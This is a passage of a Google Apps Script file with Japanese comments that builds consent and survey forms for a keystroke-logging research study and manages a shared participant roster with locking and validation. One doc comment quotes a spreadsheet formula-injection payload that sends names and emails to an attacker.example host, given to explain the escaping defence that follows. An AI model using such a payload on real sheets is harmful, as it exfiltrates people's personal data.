    "★★★ 1 日ごとにまとめた記録が、48 時間おいてから暗号化されて自動的に研究者へ送られることの説明を受けました。",
    "★★★ 送られる前なら端末の上で消せること、送られたあとは研究者に申し出れば削除され、" +
      "その削除が記録に残ることを理解しました。",
    "★ 保管の上限（暗号化した記録は " +
      O1_RETENTION_ENCRYPTED +
      "、復号したものは " +
      O1_RETENTION_PLAINTEXT +
      "、集計値は " +
      O1_RETENTION_METRICS +
      "）の説明を受けました。",
    "★ 参加はいつでもやめられ、やめた時点でそれまでの記録の削除も求められることを理解しました。",
    "上記すべてに同意し、この記録と研究利用に同意します。",
  ];
}

function buildO1ConsentForm() {
  var form = o1OpenFixed_(o1Config_().consentFormId, "FORM_ID_O1_CONSENT");
  if (O1_CLEAR_EXISTING) {
    o1AssertSafeToRebuild_(form, "O1-C 説明・同意");
    o1ClearForm_(form);
  }

  form.setTitle(o1ConsentFormTitle_());
  form.setDescription(o1ConsentFormDescription_());
  form.setCollectEmail(false); // ★ 下の設問で明示的に取る (何を取るかを本人に見せる)
  form.setShowLinkToRespondAgain(false);
  form.setConfirmationMessage(
    "ご回答ありがとうございます。\n" +
      "参加者ID とアプリの入手方法を、ご記入のメールアドレスへお送りします。\n" +
      "★ 届かない場合は " +
      O1_CONTACT_EMAIL +
      " へお知らせください。"
  );

  o1AddSectionHeader_(
    form,
    "同意の確認",
    "以下のすべてに同意いただける場合のみ、参加をお願いします。\n" +
      "★ 1 つでも同意いただけない項目があれば、このまま閉じてください（不利益はありません）。"
  );

  o1ConsentItemTitles_().forEach(function (title) {
    var q = form.addCheckboxItem();
    q.setTitle(title);
    q.setChoices([q.createChoice("同意する / 理解した")]);
    q.setRequired(true);
  });

  // ⚠️★★★ §6 の「宣言ブロック」「画面録画」は **このフォームでは同意を取らない。**
  //   ★ `consent-draft-o1.md` §6 が逐語「お願いする場合は、必ず個別に説明して同意をいただきます」
  //     と約束している。★ ここでまとめて取ると、その約束が破れる。
  //   → ★ **お知らせだけ**を置く (同意項目にしない)。
  o1AddSectionHeader_(
    form,
    "★ 一部の方へのお願いについて（★ ここでは同意を取りません）",
    "図面 / 動画編集 / スライドなど、文字をあまり打たない作業をされる方には、\n" +
      "別の測定（宣言ブロック）や、確認用のごく短い画面録画を、後日あらためてお願いすることがあります。\n" +
      "⚠️ ★ その場合は**必ず個別に説明し、あらためて同意をいただきます**。断っても不利益はありません。\n" +
      "★ このフォームでその同意を取ることはありません。"
  );

  o1AddSectionHeader_(
    form,
    "ご記名",
    "★ 参加者ID をお送りするため、また削除のお申し出を受け付けるために必要です。\n" +
      "⚠️ 記録（打鍵のログ）とは別に保管し、P0xx とのみ結び付けます。"
  );
  // ★ P-ID は Phase1 / G1 と共有する (同じ人＝同じ ID)。
  //   ⚠️ 必須にしない — 初参加の方は持っていない (その場合はこちらで採番する)。
  var pid = form.addTextItem();
  pid.setTitle(Q_O1_PID);
  pid.setHelpText(
    "以前 GSE の検証（Phase1 / G1）にご参加いただいた方は、そのときお伝えした " +
      "P から始まる記号（例: P015）をご記入ください。初めての方は空欄で構いません。"
  );
  // ⚠️★ 形式を**フォームでも**検証する（Codex 指摘・2026-08-28）。
  //   ★ 打ち間違いは提出前に本人が直せるのがいちばん安い。
  //   ⚠️ 必須ではないので**空欄は通る**（★ 初参加の人を止めない）。
  //   ★ 後段（`onO1ConsentSubmit`）でも同じ規則で検証する（★ 二重に持つ）。
  pid.setValidation(
    FormApp.createTextValidation().requireTextMatchesPattern("^[PpＰｐ]?[0-9０-９]*$").build()
  );
  form.addTextItem().setTitle(Q_O1_NAME).setRequired(true);
  var mail = form.addTextItem();
  mail.setTitle(Q_O1_EMAIL);
  mail.setRequired(true);
  mail.setValidation(FormApp.createTextValidation().requireTextMatchesPattern(".+@.+").build());

  // ★ どちらの配布物を送るかがこれで決まる (`O1_実施用_Windows.zip` / `O1_実施用_macOS.zip`)。
  //   ⚠️ 端末を特定する情報ではない (機種名・ホスト名は聞かない)。
  var os = form.addMultipleChoiceItem();
  os.setTitle(Q_O1_OS);
  os.setHelpText("★ お送りするアプリが違うためお聞きします。⚠️ 機種名やホスト名はお聞きしません。");
  os.setChoices([os.createChoice("Windows"), os.createChoice("Mac"), os.createChoice("両方使う")]);
  os.setRequired(true);

  o1RecordFormUrl_("O1_CONSENT", form, "O1-C 説明・同意（★ 同意の正本）");
  Logger.log("O1-C 説明・同意を構築した: " + form.getPublishedUrl());
}

/**
 * ★ 回答を保ったまま同意項目を**足す**（削除しない）。
 * ⚠️ `setupO1Forms()` は回答があると止まるので、運用開始後の更新はこちらを使う。
 * ★ 説明文とタイトルは上書きする（文面の訂正はこれで届く）。
 */
function migrateO1ConsentForm() {
  var form = o1OpenFixed_(o1Config_().consentFormId, "FORM_ID_O1_CONSENT");
  form.setTitle(o1ConsentFormTitle_());
  form.setDescription(o1ConsentFormDescription_());

  var existing = {};
  form.getItems().forEach(function (it) {
    existing[it.getTitle()] = true;
  });

  var added = 0;
  o1ConsentItemTitles_().forEach(function (title) {
    if (existing[title]) return;
    var q = form.addCheckboxItem();
    q.setTitle(title);
    q.setChoices([q.createChoice("同意する / 理解した")]);
    q.setRequired(true);
    added++;
    Logger.log("➕ 同意項目を追加: " + title);
  });

  // ⚠️★★ 追加した項目は**末尾**に付く。★ 既に回答した人はその項目に同意していない。
  //   → 黙って進めない。研究者に判断させる。
  if (added) {
    Logger.log(
      "⚠️★★★ " +
        added +
        " 件の同意項目を追加しました。\n" +
        "  ★ **既に回答した方は、この項目に同意していません。**\n" +
        "  ⚠️ 追加が実質的な内容変更なら、既存の参加者に**あらためて同意を取り直す**こと。"
    );
  } else {
    Logger.log("✅ 追加する同意項目はありません（フォームはコードと一致しています）");
  }
  return added;
}

// ============================================================
// O1-S 終了後アンケート
// ============================================================
// ★ 入れるもの (研究者判断 2026-08-28): **受容性・負担 (ADR-014 D8)** ＋ **宣言 UI の使い勝手**。
//
// ⚠️★★★ **「一時停止・削除の理由」を聞かない。**
//   ★ 同意文書 §4 が逐語「理由を聞きません」「理由を説明する必要はありません」と約束しており、
//     `RecordingControls.tsx` も理由の入力欄を置いていない。
//   ⚠️ 事後アンケートで聞けば、**約束は形の上で守られていても実質が破れる**
//     (「あとで理由を聞かれる」なら、被験者は止めにくくなる)。
//   → ★ 回数だけを聞き、⚠️ **理由を尋ねる設問を置かない**。
//     `o1_form_builder_test.cjs` がこれを機械で検査している。
function buildO1PostSurveyForm() {
  var form = o1OpenFixed_(o1Config_().surveyFormId, "FORM_ID_O1_SURVEY");
  if (O1_CLEAR_EXISTING) {
    o1AssertSafeToRebuild_(form, "O1-S 終了後アンケート");
    o1ClearForm_(form);
  }

  form.setTitle("GSE O1 — 終了後アンケート");
  form.setDescription(
    "ご協力ありがとうございました。最後にいくつか伺います（5 分ほど）。\n\n" +
      "★ この回答は**記録の解析には使いません**。★ 進め方と道具の改善のために伺うものです。\n" +
      "★ 正解はありません。答えたくない設問は飛ばして構いません。\n\n" +
      "⚠️ 「一時停止」や「削除」を使われた**理由はお聞きしません**（お約束のとおりです）。"
  );
  form.setCollectEmail(false); // ★ PII を取らない (参加者 ID のみ)
  form.setShowLinkToRespondAgain(false);
  form.setConfirmationMessage("ご協力ありがとうございました。");

  var sid = form.addTextItem();
  sid.setTitle(Q_O1_SUBJECT_ID);
  sid.setRequired(true);
  sid.setValidation(FormApp.createTextValidation().requireTextMatchesPattern("P[0-9]+").build());

  // --- 1. 受容性・負担 (ADR-014 D8) ------------------------------------------
  o1AddSectionHeader_(
    form,
    "1. 記録されていることについて",
    "★ 率直なところを教えてください。⚠️ 否定的な回答で不利益になることはありません。"
  );

  var burden = form.addMultipleChoiceItem();
  burden.setTitle(Q_O1_S_BURDEN);
  burden.setChoices([
    burden.createChoice("まったく気にならなかった"),
    burden.createChoice("ときどき気になった"),
    burden.createChoice("しばしば気になった"),
    burden.createChoice("ずっと気になっていた"),
  ]);
  burden.setRequired(true);

  form.addParagraphTextItem().setTitle("気になった場面があれば教えてください（任意）。");

  // ★★ reactivity —— **これが D8 の中心**である。
  //   ⚠️ 「気にならなかった」でも作業を変えていることがあるので、別に聞く。
  var reactivity = form.addMultipleChoiceItem();
  reactivity.setTitle("記録されていることで、ふだんの作業のしかたを変えましたか。");
  reactivity.setChoices([
    reactivity.createChoice("変えなかった"),
    reactivity.createChoice("最初の数日だけ少し変えた"),
    reactivity.createChoice("ときどき変えた"),
    reactivity.createChoice("ずっと変えていた"),
  ]);
  reactivity.setRequired(true);
  form.addParagraphTextItem().setTitle("変えた場合、どのように変えましたか（任意）。");

  // ⚠️★★★ 2026-08-28 の訂正 (security-checker 指摘)。
  //   ★ 旧文は「**記録を避けるために**、アプリを止めたり別の端末を使ったりしましたか」だった。
  //   ⚠️ これは**一時停止の動機を尋ねている**ので、同意文書 §4 の逐語「理由を聞きません」に反する
  //     （★ 本ファイルが上で自ら禁じている当のもの。⚠️ 検査は「理由」の語しか見ておらず素通りした）。
  //   → ★ **行動だけ**を聞く形に直した。⚠️ 「なぜ」を含む語を入れないこと。
  var otherDevice = form.addMultipleChoiceItem();
  otherDevice.setTitle("この期間、アプリを入れていない別の端末で作業した日はありましたか。");
  otherDevice.setHelpText(
    "★ あっても全く問題ありません。⚠️ 記録の抜けを正しく読むために伺っています。" +
      "★ 理由はお聞きしません。"
  );
  otherDevice.setChoices([
    otherDevice.createChoice("なかった"),
    otherDevice.createChoice("1〜2 日あった"),
    otherDevice.createChoice("何日もあった"),
  ]);

  // ⚠️★★★ **回数だけ**。理由は聞かない (上のコメント参照)。
  var pause = form.addMultipleChoiceItem();
  pause.setTitle(Q_O1_S_PAUSE_USED);
  pause.setHelpText("⚠️ ★ 使われた**理由はお聞きしません**。回数の目安だけ教えてください。");
  pause.setChoices([
    pause.createChoice("使わなかった"),
    pause.createChoice("1〜2 回使った"),
    pause.createChoice("週に 1 回程度使った"),
    pause.createChoice("ほぼ毎日使った"),
    pause.createChoice("★ 機能があることを知らなかった"),
  ]);
  pause.setRequired(true);

  var del = form.addMultipleChoiceItem();
  del.setTitle("「この時間帯の記録を消す」を使いましたか。");
  del.setHelpText("⚠️ ★ こちらも**理由はお聞きしません**。");
  del.setChoices([
    del.createChoice("使わなかった"),
    del.createChoice("使った"),
    del.createChoice("★ 機能があることを知らなかった"),
    del.createChoice("使おうとしたが、やり方が分からなかった"),
  ]);
  del.setRequired(true);

  var quit = form.addMultipleChoiceItem();
  quit.setTitle("途中でやめようと思ったことはありましたか。");
  quit.setChoices([
    quit.createChoice("なかった"),
    quit.createChoice("少し思った"),
    quit.createChoice("かなり思った"),
  ]);

  var again = form.addMultipleChoiceItem();
  again.setTitle("同じ記録を、この先も続けられそうですか。");
  again.setChoices([
    again.createChoice("続けられる"),
    again.createChoice("短い期間なら続けられる"),
    again.createChoice("続けたくない"),
  ]);
  again.setRequired(true);

  // --- 2. 宣言 UI の使い勝手 ---------------------------------------------------
  o1AddSectionHeader_(
    form,
    "2. 「作業の種類」の選択について",
    "画面のすみに出ていた「記録中 · 作業の種類: ○○」の表示についてです。\n" +
      "★ 選び忘れても記録は続いていますので、忘れたこと自体は問題ありません。"
  );

  var repick = form.addMultipleChoiceItem();
  repick.setTitle(Q_O1_S_DECL_REPICK);
  repick.setChoices([
    repick.createChoice("作業が変わるたびに選び直した"),
    repick.createChoice("だいたい選び直した"),
    repick.createChoice("ときどき選び直した"),
    repick.createChoice("最初に選んだきりだった"),
    repick.createChoice("一度も選ばなかった"),
  ]);
  repick.setRequired(true);

  var fit = form.addMultipleChoiceItem();
  fit.setTitle("4 つの選択肢は、ご自身の作業に合っていましたか。");
  fit.setHelpText("論述 / 通信文 / デザイン・映像・制作作業 / vibe coding");
  fit.setChoices([
    fit.createChoice("だいたい合っていた"),
    fit.createChoice("合わない作業が半分くらいあった"),
    fit.createChoice("ほとんど合わなかった"),
  ]);
  fit.setRequired(true);

  form.addParagraphTextItem().setTitle("★ 足りないと感じた選択肢があれば教えてください（任意）。");

  var mark = form.addMultipleChoiceItem();
  mark.setTitle("「記録中」の印は、いつも見えていましたか。");
  mark.setHelpText("⚠️ 見えていなかった場面があれば、下の欄で教えてください（重要です）。");
  mark.setChoices([
    mark.createChoice("いつも見えていた"),
    mark.createChoice("見えないことがあった"),
    mark.createChoice("印があることを意識していなかった"),
  ]);
  mark.setRequired(true);
  form.addParagraphTextItem().setTitle("見えないことがあった場合、どんな場面でしたか（任意）。");

  // --- 3. 自由記述 -------------------------------------------------------------
  o1AddSectionHeader_(form, "3. 最後に", "");
  form
    .addParagraphTextItem()
    .setTitle("お気づきの点・言っておきたいことがあれば、何でも教えてください（任意）。");

  o1RecordFormUrl_("O1_SURVEY", form, "O1-S 終了後アンケート（★ 解析には使わない）");
  Logger.log("O1-S 終了後アンケートを構築した: " + form.getPublishedUrl());
}

// ============================================================
// P-ID の採番 (★ Phase1 のロスターに対して行う)
// ============================================================
// ★ Phase1 の nextParticipantId_ / G1 の g1NextParticipantId_ と同じ規則
//   (P + 3 桁ゼロ埋め・既存の最大値 + 1)。
// ⚠️ ★ 実装が 3 つになるので、**規則を変えるときは 3 つとも**直す (Form_Phase1 側が正)。
//
// ⚠️★★★ **1 か所だけ意図的に G1 と違う。** G1 / Phase1 は `last > 1` のときしか
//   ロスターを読まない。★ 規則そのものは同じだが、⚠️ **行が 1 行しか無いロスターで
//   既存の P-ID を見落とす**: 例えば `P001` だけが入っているシートに対して
//   `last > 1` は偽になり、`max = 0` のまま **`P001` を返して衝突する**。
//   ★ ここでは `last >= 1` で読む。
//   ⚠️ 見出し行があっても `^P(\d+)$` に一致しないので無視され、
//     ★ 行が 2 行以上あるとき (＝現行ロスター) の結果は **G1 と 1 バイトも変わらない**。
//   (2026-08-28 に `o1_form_builder_test.cjs` §4 / §5 が実測して見つけた)

function o1NextParticipantId_(sheet) {
  var max = 0;
  var last = sheet.getLastRow();
  var values = last >= 1 ? sheet.getRange(1, 1, last, 1).getValues() : [];
  for (var i = 0; i < values.length; i++) {
    var m = String(values[i][0]).match(/^P(\d+)$/);
    if (m) {
      var n = parseInt(m[1], 10);
      if (n > max) max = n;
    }
  }
  var next = max + 1;
  return "P" + (next < 1000 ? ("000" + next).slice(-3) : String(next));
}

/**
 * Phase1 ロスターを引く。見つかれば `{pid, row}`、⚠️ 取り違えなら `{conflict: true, ...}`。
 *
 * ⚠️★★★ **申告された P-ID をそのまま信用しない** (security-checker 指摘・2026-08-28)。
 *
 *   ★ O1-C の「参加者ID（お持ちの方のみ）」は**自由記入で任意**であり、フォーム URL は
 *     被験者に配られる。→ ⚠️ 打ち間違い (`P015` → `P016`) でも、第三者の申告でも、
 *     **他人の P-ID を名乗れてしまう**。
 *   ⚠️ 旧実装は P-ID 一致だけで既存扱いにしていたので、その場合
 *     **B さんの数週間ぶんの常時打鍵ログが A さんの P-ID で提出される**。
 *     → ★ A さんから削除要求が来たとき、台帳 A-1 の `<pid>_o1day*` の削除は
 *       **B のデータも消すか、A のを消し残すか**のどちらかになり、
 *       ⚠️ 同意文書 §4-3 の「消えます」が**履行不能**になる。
 *
 * ★ したがって照合の順序を変えた:
 *   1. **メール一致を最優先**する (★ 受付メールを送る先と同じ = 自己整合的)
 *   2. メールで見つからないときだけ、申告された P-ID を見る
 *      - ★ その行のメールが**空**なら採用する (氏名だけ先に入れた行を埋める正当な経路)
 *      - ⚠️ **別のメールが入っていたら `conflict`** —— 発番も送信もせず、研究者に判断させる
 */
function o1FindInPhase1Roster_(sheet, opts) {
  var last = sheet.getLastRow();
  if (last < 1) return null;
  var rows = sheet.getRange(1, 1, last, 3).getValues(); // P-ID / 氏名 / メール
  var email = opts.email ? String(opts.email).trim().toLowerCase() : "";
  var pid = opts.pid ? String(opts.pid).trim().toUpperCase() : "";
  var i, rowPid, rowEmail;

  // 1. ★ メール一致（★ 最も強い手がかり。本人の受信箱と一致する）
  if (email) {
    for (i = 0; i < rows.length; i++) {
      rowEmail = String(rows[i][2]).trim().toLowerCase();
      if (rowEmail && rowEmail === email) {
        rowPid = String(rows[i][0]).trim().toUpperCase();
        // ⚠️★★ **A 列の値をそのまま P-ID として返さない**（Codex 指摘・2026-08-28）。
        //   ★ 空なら後段が採番して埋める（正当な経路）。
        //   ⚠️ 空でないのに `P<数字>` でないなら、見出し行・手入力ミス・別の記法である。
        //     → ★ その値で受付メールを送ると、被験者は**存在しない ID**を信じて入力する。
        //     ⚠️ 自動で直すと本当の ID を上書きしうるので、**研究者に判断させる**。
        if (rowPid && !o1IsValidPid_(rowPid)) {
          return { conflict: true, pid: rowPid, row: i + 1, reason: "invalid-pid-in-roster" };
        }
        return { pid: rowPid, row: i + 1 };
      }
    }
  }

  // 2. ★ 申告された P-ID（⚠️ 検証つき）
  if (pid) {
    for (i = 0; i < rows.length; i++) {
      rowPid = String(rows[i][0]).trim().toUpperCase();
      if (rowPid !== pid) continue;
      rowEmail = String(rows[i][2]).trim().toLowerCase();
      if (!rowEmail) {
        // ⚠️★★★ **メールが空なだけでは採用しない**（2026-09-03・G1 から移植）。
        //
        //   ★ 実測された乗っ取り経路: `o1AssignParticipantId_()` 系は `appendRow([newPid])` で
        //     **氏名もメールも空の行**を作る。⚠️ 研究者が手入力するまでの間、その P-ID を
        //     申告した**誰でも**この分岐を通り、その ID を受け取り、**自分のメールがその行に
        //     書き込まれ**、受付メールが届く。
        //   ⚠️ P-ID は連番・フォーム URL は配布済み・`setCollectEmail(false)` なので Google 認証も
        //     無い → ★ **総当たりで当たる**。
        //   ⚠️★★ しかも **ロスターは Phase1 / G1 / O1 で共用**なので、被害は O1 に閉じない。
        //
        // ★ そこで **氏名が入っている行だけ**採用する:
        //   - 研究者が「氏名を先に入れた行」を埋めるのは**正当な経路**なので通す
        //   - ⚠️ 裸の行（氏名も空）は **conflict** にして研究者に判断させる
        //   ★ 安全側に倒れる: 誤って止めても研究者が確認して再提出してもらえばよい。
        //
        // ⚠️★★★ **これは G1 (`Form_G1/GSE_G1_Form_Builder.gs` の `bare-row-claim`) の移植である。**
        //   ★ 移植にあたり**列構成を読み比べて**確認した: `O1_ROSTER_HEAD` は
        //   `["P-ID", "氏名/ニックネーム", "メール", "OS"]` で G1 と同じ並びであり、
        //   `rows[i][1]` が氏名・`rows[i][2]` がメールで一致する。
        //   ⚠️ 列がズレたまま移植すると**氏名欄でないものを氏名として読む**ので、
        //   ★ `O1_ROSTER_HEAD` を変えるときはこの分岐も一緒に見直すこと。
        var rowName = String(rows[i][1] == null ? "" : rows[i][1]).trim();
        if (!rowName) {
          return { conflict: true, pid: rowPid, row: i + 1, reason: "bare-row-claim" };
        }
        return { pid: rowPid, row: i + 1 }; // ★ 氏名がある = 研究者が用意した行
      }
      // ⚠️★★★ 別人のメールが入っている行を名乗っている。
      return { conflict: true, pid: rowPid, row: i + 1, reason: "email-mismatch" };
    }
  }

  return null;
}

/**
 * ★ P-ID の形式（`P` ＋ 数字）。⚠️ **採番規則と同じ形**であること
 * （`o1NextParticipantId_` が `^P(\d+)$` で読むので、そこと食い違わせない）。
 */
function o1IsValidPid_(v) {
  return /^P\d+$/.test(String(v == null ? "" : v).trim().toUpperCase());
}

/** ログに実アドレスを残さない (data-privacy)。 */
function o1MaskEmail_(email) {
  var s = String(email);
  var at = s.indexOf("@");
  if (at <= 1) return "***";
  return s.charAt(0) + "***" + s.substring(at);
}

/**
 * ⚠️★★★ **ロスターを触る操作は必ずこれで包む。**
 *
 * ★ 採番は「読んで最大値を出す → 書く」なので、**包まないと同時実行で同じ番号が 2 人に出る**。
 * ⚠️ かつて `onO1ConsentSubmit` だけがロックを取り、`assignO1ParticipantId`（研究者の手動採番）は
 *   その**外側**で走っていた。★ フォーム提出と手動採番が重なると衝突する
 *   (code-reviewer 指摘・2026-08-28)。→ ★ 両方をここへ通す。
 *
 * @return {*} `fn()` の戻り値。⚠️ ロックを取れなければ `null`（★ 呼び出し側は中止すること）。
 */
function o1WithRosterLock_(fn) {
  var lock = LockService.getScriptLock();
  try {
    lock.waitLock(30000);
  } catch (lockErr) {
    Logger.log("❌ ロスターのロックを取得できませんでした（★ 何も書いていません）: " + lockErr);
    return null;
  }
  try {
    return fn();
  } finally {
    lock.releaseLock();
  }
}

// ============================================================
// ⚠️★★★ ロスターの「形」を確かめる (★ 段 4・起票 T-23)
// ============================================================
// ★ 拒否リスト `o1IsKnownWrongRoster_` は **既知の 1 枚**しか弾けない。
//   ⚠️ 「参加者ロスター」タブを持つ**新しいシート**を指すと素通りし、
//     **P001 から採番して実在の P-ID と衝突する**（★ 別人のデータが 1 つの ID に混ざる）。
//   → ★ 「本物のロスターの形をしているか」を機械で見る。
//
// ⚠️★★ **14 列すべての一致は要求しない。** ★ 要求すると、ロスターに列を 1 つ足しただけで
//   O1 の登録が止まる（＝ fail-closed が過剰に効く）。
//   → ★ **O1 が実際に読み書きする先頭 4 列だけ**を守る。
//   ⚠️ 14 列の完全一致は `o1_form_builder_test.cjs` が
//     `Form_Phase1/GSE_Phase1_Form_Builder.gs` の `ROSTER_HEADER` と照合している
//     （★ 2 か所に同じ定数を持つので、ずれたらテストが赤になる）。
var O1_ROSTER_HEAD = ["P-ID", "氏名/ニックネーム", "メール", "OS"];

/** 見出し行を探す範囲 (★ 実物は行 1 が機密バナー・行 2 が見出し)。 */
var O1_ROSTER_HEADER_SCAN_ROWS = 10;

/**
 * ★ ロスターの形を検査する。問題があれば**理由の文字列**、無ければ空文字を返す。
 * ⚠️ 「開けたから正しい」ではない。★ 中身の形まで見る。
 */
function o1RosterShapeProblem_(sheet) {
  var last = sheet.getLastRow();
  if (last < 1) {
    return "シートが空です（⚠️ 新規に作ったシートを指していませんか）";
  }
  if (sheet.getMaxColumns() < O1_ROSTER_HEAD.length) {
    return "列が " + O1_ROSTER_HEAD.length + " 列に足りません（⚠️ 参加者ロスターの形ではありません）";
  }
  var scan = Math.min(last, O1_ROSTER_HEADER_SCAN_ROWS);
  var head = sheet.getRange(1, 1, scan, O1_ROSTER_HEAD.length).getValues();
  var headerRow = -1;
  for (var i = 0; i < head.length; i++) {
    if (String(head[i][0]).trim() === O1_ROSTER_HEAD[0]) {
      headerRow = i;
      break;
    }
  }
  if (headerRow < 0) {
    return (
      "見出し行が先頭 " + scan + " 行に見つかりません（★ A 列が「" + O1_ROSTER_HEAD[0] + "」の行）"
    );
  }
  for (var c = 0; c < O1_ROSTER_HEAD.length; c++) {
    var actual = String(head[headerRow][c]).trim();
    if (actual !== O1_ROSTER_HEAD[c]) {
      // ⚠️ セルの中身を**丸ごとログへ出さない**（security-checker LOW・2026-08-29）。
      //   ★ 実行ログは削除台帳 A-10 の対象である。→ 先頭 20 文字だけにする。
      return (
        "見出しの " + (c + 1) + " 列目が「" + actual.slice(0, 20) + "」です（★「" +
        O1_ROSTER_HEAD[c] + "」のはず）"
      );
    }
  }
  // ★ **データ行が 1 つも無いロスターは採番元ではない**（⚠️ 新規シートはここで落ちる）。
  var col = sheet.getRange(1, 1, last, 1).getValues();
  for (var r = 0; r < col.length; r++) {
    if (o1IsValidPid_(String(col[r][0]).trim().toUpperCase())) return "";
  }
  // ⚠️★ 原因は 2 つありうる（cross-review 指摘・2026-08-29）。★ **両方を書く** ——
  //   片方だけ書くと、⚠️ 正当に空なだけのロスターを「シートの取り違え」と誤診断する。
  return (
    "P-ID の行が 1 つもありません（⚠️ 新規に作った空のロスターを指していませんか / " +
    "★ 移行直後などで**正当に 0 件**なら、先に 1 人を手で登録してください）"
  );
}

/**
 * ⚠️★★★ **ロスターへ書く値を数式にしない** (security-checker HIGH・2026-08-29)。
 *
 * ★ Apps Script の `appendRow` / `setValue` は **先頭が `=` の文字列を数式として格納する**。
 * ⚠️ 氏名欄は**被験者の自由記入**で、★ フォーム URL は配られ、`setCollectEmail(false)` なので
 *   Google 認証も要求していない。→ 誰でも次を提出できる:
 *
 *     =IMPORTDATA("https://attacker.example/x?d=" & TEXTJOIN(",", 1, B2:C200))
 *
 * ⚠️★★★ **研究者がロスターを開いた瞬間**に Sheets が URL を取りに行き、
 *   **Phase1 / G1 / O1 で共用している全参加者の氏名とメール**が外部へ出る
 *   （★ クリックは要らない。`=IMAGE(...)` も同型）。
 *   ⚠️ 流出先はまさに `docs/o1-deletion-ledger.md` §5b の 1 番＝**対応表そのもの**である。
 *
 * ★ 先頭に `'` を付けると Sheets は「文字列」の印として扱い、⚠️ **セルの値には残らない**
 *   （＝ 研究者が見る表示は変わらない）。
 * ⚠️ 受け口の `sanitizeName_` は**ファイル名用**であって、ロスター書き込みには効いていなかった。
 */
function o1PlainText_(v) {
  var s = String(v === null || v === undefined ? "" : v);
  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
}

/**
 * ★ ロスターの形を**読み取りだけ**で確かめる (起票 T-23 の実物確認)。
 *
 * ⚠️★★★ **配備したら必ず 1 度実行すること。**
 *   ★ この検査は fail-closed なので、⚠️ 実物と食い違っていると
 *     **最初の被験者の登録で初めて発動する**（＝ 被験者を待たせて気づく）。
 *   ★ `checkO1FormConfig()` は**設定しか見ない**ので、ロスターの中身までは確かめられない。
 *
 * ⚠️ **PII を出さない**（★ 出すのは行数と判定だけ）。
 */
function checkO1RosterShape() {
  var rosterSheetId = o1Config_().rosterSheetId;
  if (!rosterSheetId) {
    Logger.log("❌ スクリプト プロパティ PHASE1_MGMT_SHEET_ID が空です。");
    return;
  }
  // ⚠️★★★ **拒否リストをここでも見る**（security-checker MEDIUM・2026-08-29）。
  //   ★ 旧シート（`12T8WU4D…`）は**同じ見出しと P-ID の行を持つ**ので、
  //     ⚠️ 形の検査だけでは「✅ 正しい」と言ってしまう。
  if (o1IsKnownWrongRoster_(rosterSheetId)) {
    Logger.log("⛔⚠️★★★ **古いほうの管理シート**を指しています（★ 形が合っていても中身が違う）。");
    Logger.log("   ★「参加者ロスター」タブに P010 以降が入っているほうが正です。");
    return;
  }
  var sheet = SpreadsheetApp.openById(rosterSheetId).getSheetByName("参加者ロスター");
  if (!sheet) {
    Logger.log("❌ 「参加者ロスター」タブがありません。★ ID を確認してください。");
    return;
  }
  var problem = o1RosterShapeProblem_(sheet);
  if (problem) {
    Logger.log(
      "⛔⚠️★★★ ロスターの形が違います: " + problem + "\n" +
        "   ★ このままだと**登録は fail-closed で止まります**（⚠️ 被験者は P-ID を受け取れません）。\n" +
        "   ★ 期待する見出し（1〜4 列目）: " + O1_ROSTER_HEAD.join(" / ")
    );
    return;
  }
  Logger.log("✅ ロスターの形は正しい（★ 見出し 4 列 ＋ P-ID の行あり）。");
  Logger.log("ℹ️ 行数: " + sheet.getLastRow() + "（⚠️ 中身は出しません）");
}

/**
 * ★ その P-ID がロスターの**どの行にあるか**を返す (起票 T-24)。
 * ⚠️ 読めなかったときは **`null`**（★ 空配列と区別する ——
 * 「1 行も無い」と「確かめられなかった」を同じ値にしない）。
 */
function o1RosterRowsForPid_(pid) {
  var sheet = o1OpenRoster_();
  if (!sheet) return null;
  var last = sheet.getLastRow();
  if (last < 1) return [];
  var want = String(pid).trim().toUpperCase();
  var col = sheet.getRange(1, 1, last, 1).getValues();
  var rows = [];
  for (var i = 0; i < col.length; i++) {
    if (String(col[i][0]).trim().toUpperCase() === want) rows.push(i + 1);
  }
  return rows;
}

/** ★ ロスターのシートを開く。⚠️ 無ければ null（★ 呼び出し側が中止する）。 */
function o1OpenRoster_() {
  var rosterSheetId = o1Config_().rosterSheetId;
  if (!rosterSheetId) {
    Logger.log(
      "❌ スクリプト プロパティ PHASE1_MGMT_SHEET_ID が空です。採番元は Phase1 の参加者ロスターただ 1 つです。\n" +
        "⚠️ O1 側にロスターを作って採番すると、2 か所採番になり必ず衝突します。"
    );
    return null;
  }
  // ⚠️★★★ **拒否リストを書き込み経路でも見る**（security-checker MEDIUM・2026-08-29）。
  //   ★ 従来は `o1ConfigProblems_` だけが見ていたので、⚠️ **トリガ設置のあとに**
  //     スクリプト プロパティを旧 ID へ書き換えられると素通りしていた
  //     （★ `onO1ConsentSubmit` は毎回 `o1Config_()` を読み直す）。
  //   ⚠️ 旧シートは**同じ見出しを持つ**ので、形の検査では止まらない。
  if (o1IsKnownWrongRoster_(rosterSheetId)) {
    Logger.log("⛔⚠️★★★ **古いほうの管理シート**を指しています。★ 発番も書き込みもしていません。");
    Logger.log("   ⚠️ そのまま書くと **実在の P-ID と衝突**します（★ 別人のデータが 1 つの ID に混ざる）。");
    return null;
  }
  var sheet = SpreadsheetApp.openById(rosterSheetId).getSheetByName("参加者ロスター");
  if (!sheet) {
    Logger.log("❌ Phase1 の管理シートに「参加者ロスター」タブがありません。ID を確認してください。");
    return null;
  }
  var problem = o1RosterShapeProblem_(sheet);
  if (problem) {
    Logger.log(
      "⛔⚠️★★★ 指しているシートは**参加者ロスターの形をしていません**: " + problem + "\n" +
        "   ★ 発番も書き込みもしていません（fail-closed）。\n" +
        "   ⚠️ 別のシートを新しく作って指すと、**P001 から採番して実在の P-ID と衝突**します。\n" +
        "   ★ 採番元は Phase1 の参加者ロスターただ 1 つです。"
    );
    return null;
  }
  return sheet;
}

/**
 * ★ 手動で採番する (フォームを通さず研究者が登録する場合)。
 * ⚠️ 通常は `onO1ConsentSubmit` が自動で行う。
 */
function assignO1ParticipantId() {
  var pid = o1WithRosterLock_(function () {
    var sheet = o1OpenRoster_();
    if (!sheet) return null;
    var p = o1NextParticipantId_(sheet);
    sheet.appendRow([p]);
    SpreadsheetApp.flush(); // ★ ロック解放前に確定させる
    return p;
  });
  if (!pid) {
    throw new Error("★ 採番できませんでした。上のログに理由が出ています。");
  }
  Logger.log("✅ P-ID を採番しました: " + pid + "（氏名・メールは Phase1 ロスターに手入力）");
  return pid;
}

// ============================================================
// 受付メール
// ============================================================
